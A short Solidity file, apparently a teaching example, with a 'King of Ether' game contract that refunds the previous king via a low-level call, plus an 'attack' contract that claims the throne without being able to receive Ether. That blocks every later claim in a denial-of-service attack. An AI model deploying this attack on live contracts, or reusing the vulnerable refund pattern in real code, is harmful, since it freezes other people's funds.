// SPDX-License-Identifier: MIT
pragma solidity 0.8.7 ;

contract kingofEth{
   
   address public king;
   uint public balance ;


   function claimThrone() public payable {
       require(msg.value > balance , "Need to pay more Ether");

       (bool sent , )= king.call{value:balance}("");

       require(sent , "Failed trasaction");

       king= msg.sender;
       balance=msg.value;

   }

}


contract attack {

    function atta(kingofEth kingofeth) public payable{
          kingofeth.claimThrone{value:msg.value}();

    } 
}


